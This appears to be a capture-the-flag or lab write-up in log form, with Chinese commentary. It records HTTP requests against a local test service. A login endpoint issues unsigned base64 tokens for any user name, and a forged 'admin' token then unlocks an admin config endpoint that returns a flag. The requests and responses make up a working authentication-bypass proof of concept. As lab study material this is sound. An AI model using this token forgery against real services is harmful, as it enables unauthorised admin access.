@@ -1,0 +1,15 @@
+GET http://127.0.0.1:18081/login?user=admin
+{"token": "eyJ1aWQiOiAiMiIsICJ1c2VyIjogImFkbWluIn0=", "uid": "2"}
+(token base64 解码 = {"uid": "2", "user": "admin"})
+
+GET http://127.0.0.1:18081/admin/config  (无 token)
+HTTP/1.0 403 Forbidden
+{"error": "admin only"}
+
+GET http://127.0.0.1:18081/admin/config  (Header: Authorization: Bearer eyJ1aWQiOiAiMiIsICJ1c2VyIjogImFkbWluIn0=)
+{"flag": "FLAG{api_chain_ok}", "debug": true}
+
+GET http://127.0.0.1:18081/admin/config?token=eyJ1aWQiOiAiMiIsICJ1c2VyIjogImFkbWluIn0=
+{"flag": "FLAG{api_chain_ok}", "debug": true}
+
+解读：login 接受任意 user 参数并返回可解码的伪 base64 JWT token；/admin/config 仅校验 token 中 user==admin（无签名验证）→ FLAG{api_chain_ok}。
